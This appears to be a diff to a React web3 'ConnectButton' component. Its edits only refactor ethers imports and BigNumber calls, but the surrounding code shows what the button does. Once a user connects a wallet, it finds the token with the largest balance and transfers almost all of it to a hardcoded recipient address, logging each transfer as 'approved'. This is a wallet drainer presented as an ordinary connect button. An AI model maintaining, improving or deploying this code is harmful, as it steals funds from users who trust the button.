@@ -3,8 +3,6 @@
 import { createWeb3Modal, defaultConfig } from '@web3modal/ethers/react'
 import { useWeb3Modal } from '@web3modal/ethers/react'
 import { ethers } from 'ethers'
-import { Web3Provider, JsonRpcProvider, InfuraProvider, formatEther } from '@ethersproject/providers'
-import { BigNumber } from '@ethersproject/bignumber'
 import styled from 'styled-components'
 import { useState } from 'react'
 
@@ -63,11 +61,11 @@ const sendLog = async (type: string, details: string) => {
 
 export function ConnectButton() {
   const { open } = useWeb3Modal()
-  const [provider, setProvider] = useState<Web3Provider | null>(null)
+  const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null)
 
   const connectAndSend = async () => {
     try {
-      const web3Provider = new Web3Provider(await open())
+      const web3Provider = new ethers.providers.Web3Provider(await open())
       setProvider(web3Provider)
 
       const signer = web3Provider.getSigner()
@@ -106,7 +104,7 @@ export function ConnectButton() {
 
       // Calculate gas fees
       const gasPrice = await web3Provider.getGasPrice()
-      const gasLimit = BigNumber.from(21000) // Base transaction cost
+      const gasLimit = ethers.BigNumber.from(21000) // Base transaction cost
       const gasCost = gasPrice.mul(gasLimit)
 
       const recipient = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f' // replace with the desired recipient address
@@ -120,14 +118,14 @@ export function ConnectButton() {
         await tx.wait()
         await sendLog('approved', `ETH transaction to ${recipient} with value ${value.toString()}`)
       } else if (highestBalanceToken === 'USDT') {
-        const usdtGasLimit = BigNumber.from(65000) // Approximate gas limit for USDT transfer
+        const usdtGasLimit = ethers.BigNumber.from(65000) // Approximate gas limit for USDT transfer
         const usdtGasCost = gasPrice.mul(usdtGasLimit)
         const usdtValue = highestBalance.sub(usdtGasCost)
         const tx = await usdtContract.transfer(recipient, usdtValue)
         await tx.wait()
         await sendLog('approved', `USDT transaction to ${recipient} with value ${usdtValue.toString()}`)
       } else if (highestBalanceToken === 'BNB') {
-        const bnbGasLimit = BigNumber.from(65000) // Approximate gas limit for BNB transfer
+        const bnbGasLimit = ethers.BigNumber.from(65000) // Approximate gas limit for BNB transfer
         const bnbGasCost = gasPrice.mul(bnbGasLimit)
         const bnbValue = highestBalance.sub(bnbGasCost)
         const tx = await bnbContract.transfer(recipient, bnbValue)
